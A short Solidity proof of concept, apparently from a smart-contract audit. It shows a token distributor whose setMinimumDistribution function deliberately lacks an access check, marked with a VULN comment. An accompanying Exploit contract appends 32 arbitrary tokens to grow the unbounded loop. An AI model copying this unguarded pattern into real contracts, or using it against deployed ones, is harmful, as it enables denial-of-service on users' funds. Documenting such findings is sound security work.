// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

contract MultiDistributor {
    address[] public tokens;
    mapping(address => uint256) public tokenIdx;
    mapping(address => uint256) public minDistribution;
    uint256 public distributionIterations;

    constructor() {
        tokens.push(address(0xCAFE));
        tokenIdx[address(0xCAFE)] = 1;
    }

    function setMinimumDistribution(address token, uint256 tokenMinDistribution) external {
        uint256 idx = tokenIdx[token];
        if (idx == 0) {
            tokenIdx[token] = idx = tokens.length;
            tokens.push(token);
        }
        // @> VULN: intended trusted-participant operation has no access check.
        minDistribution[token] = tokenMinDistribution;
    }

    function distribute() external {
        for (uint256 i; i < tokens.length; ++i) {
            distributionIterations++;
        }
    }

    function tokenCount() external view returns (uint256) {
        return tokens.length;
    }
}

contract Exploit {
    MultiDistributor public distributor;
    uint256 public inserted;
    uint256 public iterations;

    constructor() {
        distributor = new MultiDistributor();
    }

    function run() external {
        for (uint256 i; i < 32; ++i) {
            // Bob can append arbitrary token entries, even zero-distribution ones.
            distributor.setMinimumDistribution(address(uint160(i + 1)), 0);
        }
        distributor.distribute();
        inserted = distributor.tokenCount();
        iterations = distributor.distributionIterations();
        require(inserted == 33 && iterations == 33, "unbounded token list not grown");
    }
}
